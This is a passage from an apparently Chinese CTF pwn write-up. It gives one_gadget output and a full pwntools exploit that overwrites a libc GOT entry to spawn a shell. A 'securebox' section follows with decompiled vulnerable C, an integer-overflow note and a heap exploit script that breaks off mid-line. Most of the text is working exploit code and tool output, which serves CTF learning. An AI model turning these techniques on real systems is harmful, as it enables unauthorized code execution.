class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">logan@LYXF:~/share/pwn1$ one_gadget libc.so.6 -l 12</span><br><span class="line">0x4f2c5 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0xe569f execve(<span class="string">&quot;/bin/sh&quot;</span>, r14, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r14] == NULL || r14 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe5858 execve(<span class="string">&quot;/bin/sh&quot;</span>, [rbp-0x88], [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="line"></span><br><span class="line">0xe585f execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  [r10] == NULL || r10 == NULL</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="line"></span><br><span class="line">0xe5863 execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r10] == NULL || r10 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line"></span><br><span class="line">0x10a398 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, [rax])</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [[rax]] == NULL || [rax] == NULL</span><br></pre></td></tr></table></figure>

<p>采用0xe569f execve(“/bin/sh”, r14, r12)能打通.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">li(<span class="string">&#x27;_dl_catch_error_got &#x27;</span> + <span class="built_in">hex</span>(_dl_catch_error_got))</span><br><span class="line"><span class="comment"># modfy dl_catch_error_got</span></span><br><span class="line">p = <span class="built_in">str</span>(_dl_catch_error_got)</span><br><span class="line">sl(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set as onegadget</span></span><br><span class="line">one_gadget = lib.address + <span class="number">0xe569f</span></span><br><span class="line">p = p64((one_gadget) &amp; <span class="number">0xFFFFFF</span>)</span><br><span class="line">li(<span class="string">&#x27;one_gadget &#x27;</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">li(<span class="string">&#x27;p &#x27;</span> + p)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;biang!&#x27;</span>)</span><br><span class="line">sl(p[<span class="number">0</span>])</span><br><span class="line">ru(<span class="string">&#x27;biang!&#x27;</span>)</span><br><span class="line">sl(p[<span class="number">1</span>])</span><br><span class="line">ru(<span class="string">&#x27;biang!&#x27;</span>)</span><br><span class="line"><span class="comment">#db()</span></span><br><span class="line">sl(p[<span class="number">2</span>])</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;chall&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;39.97.210.182&quot;</span></span><br><span class="line">remotePort = <span class="number">10055</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	ru(<span class="string">&#x27;near: &#x27;</span>)</span><br><span class="line">	lib.address = <span class="built_in">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - lib.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br><span class="line">	_dl_catch_error_got = lib.address + (<span class="number">0x7f15af376038</span> - <span class="number">0x7f15af377000</span>)</span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;_dl_catch_error_got &#x27;</span> + <span class="built_in">hex</span>(_dl_catch_error_got))</span><br><span class="line">	<span class="comment"># modfy dl_catch_error_got</span></span><br><span class="line">	p = <span class="built_in">str</span>(_dl_catch_error_got)</span><br><span class="line">	sl(p)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># set as onegadget</span></span><br><span class="line">	one_gadget = lib.address + <span class="number">0xe569f</span></span><br><span class="line">	p = p64((one_gadget) &amp; <span class="number">0xFFFFFF</span>)</span><br><span class="line">	li(<span class="string">&#x27;one_gadget &#x27;</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">	li(<span class="string">&#x27;p &#x27;</span> + p)</span><br><span class="line"></span><br><span class="line">	ru(<span class="string">&#x27;biang!&#x27;</span>)</span><br><span class="line">	sl(p[<span class="number">0</span>])</span><br><span class="line">	ru(<span class="string">&#x27;biang!&#x27;</span>)</span><br><span class="line">	sl(p[<span class="number">1</span>])</span><br><span class="line">	ru(<span class="string">&#x27;biang!&#x27;</span>)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	sl(p[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">logan@LYXF:~/share/pwn1$ one_gadget libc.so.6 -l 12</span></span><br><span class="line"><span class="string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe569f execve(&quot;/bin/sh&quot;, r14, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r14] == NULL || r14 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe5858 execve(&quot;/bin/sh&quot;, [rbp-0x88], [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe585f execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe5863 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a398 execve(&quot;/bin/sh&quot;, rsi, [rax])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [[rax]] == NULL || [rax] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="securebox"><a href="#securebox" class="headerlink" title="securebox"></a>securebox</h1><h2 id="难度-1"><a href="#难度-1" class="headerlink" title="难度"></a>难度</h2><p>4 / 10</p>
<h2 id="保护-1"><a href="#保护-1" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="简单描述-1"><a href="#简单描述-1" class="headerlink" title="简单描述"></a>简单描述</h2><p>有5个功能,添加 ,删除,修改,打印,默认退出,添加成功有加密用的key,在修改功能中,对输入的数据进行加密,没有堆一般的常见漏洞</p>
<h2 id="vul-1"><a href="#vul-1" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">   size = InputNum();</span><br><span class="line">    <span class="comment">// vul:unsigned long int as unsigned int</span></span><br><span class="line">   <span class="keyword">if</span> ( size &gt; <span class="number">0x100</span> &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size &lt;= <span class="number">0xFFF</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     plist[idx] = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);             <span class="comment">// head  -----------</span></span><br><span class="line">     *((_QWORD *)plist[idx] + <span class="number">4</span>) = size;</span><br><span class="line">     head_heap = plist[idx];</span><br><span class="line">     head_heap[<span class="number">3</span>] = <span class="built_in">malloc</span>(size);              <span class="comment">// content----&gt;</span></span><br><span class="line">     <span class="built_in">memset</span>(plist[idx], <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">     gen_key(plist[idx]);</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">&quot;Key: &quot;</span>);</span><br><span class="line">     <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, *((<span class="keyword">unsigned</span> __int8 *)plist[idx] + j));</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nBox ID: %d\n&quot;</span>, idx);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><p>整数溢出</p>
<p>malloc分配失败的大小</p>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;./chall&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;39.97.210.182&quot;</span></span><br><span class="line">remotePort = <span class="number">19806</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">data, key</span>):</span></span><br><span class="line">	result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">		result += p8( u8(data[i]) ^ u8(key[ i &amp; <span class="number">0xF</span>]) )</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;5.Exit&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	ru(<span class="string">&#x27;Key: \n&#x27;</span>)</span><br><span class="line">	key = p8(<span class="built_in">int</span>(ru(<span class="string">&#x27; &#x27;</span>), <span class="number">16</span>))</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">		key += p8(<span class="built_in">int</span>(ru(<span class="string">&#x27; &#x27;</span>), <span class="number">16</span>))</span><br><span class="line">	<span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;5.Exit&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;Box ID:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">idx, offset, size, data, key</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;5.Exit&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;Offset of msg:&#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, enc(data, key))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>(<span class="params">idx, offset, size</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;5.Exit&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;Offset of msg:&#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">	sla(<span class="string">&#x27;Len of msg:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">data, key</span>):</span></span><br><span class="line">	result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">		result += p8(u8(data[i]) ^ ( u8(key) + (i &amp; <span class="number">0xF</span>)))</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line"></span><br><span class="line">	key_0 = ad(<span class="number">0x210</span>)</span><br><span class="line">	key_1 = ad(<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	key_2 = ad(<span class="number">0x210</span>)</span><br><span class="line">	md(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x8</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x8</span>, key_2)</span><br><span class="line">	dp(<span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>)</span><br><span class="line">	lib.address = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">	li(<span class="string">&#x27;libc base &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br><span class="line">	gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">	one_gadget = lib.address + gadget[<span class="number">1</span>]</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># add integer overflow</span></span><br><span class="line">	sla(<span class="string">&#x27;5.Exit&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;-&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xFFFFFEF8</span> <span class="number">-0x100</span>))</span><br><span class="line">	ru(<span class="string">&#x27;Key: \n&#x27;</span>)</span><br><span class="line">	key_3 = 